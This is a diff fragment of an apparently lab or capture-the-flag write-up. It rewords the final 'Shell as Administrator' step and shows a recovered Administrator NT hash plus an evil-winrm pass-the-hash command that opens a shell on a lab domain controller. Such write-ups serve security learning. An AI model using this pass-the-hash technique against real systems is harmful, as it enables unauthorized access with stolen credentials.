@@ -567,7 +567,7 @@ We recover the `Administrator` NT hash `31592a42841d0a9e74f93c41d8884cd0`.
 
 ## Shell as Administrator (root.txt)
 
-NTLM authenticates with the hash itself, so there is nothing left to crack. We pass it to Evil-WinRM for an interactive session and read root.txt.
+We log in to the domain controller over WinRM with `Administrator`'s NT hash and read root.txt.
 
 ```
 evil-winrm -i '10.0.30.204' -u 'Administrator' -H '31592a42841d0a9e74f93c41d8884cd0'
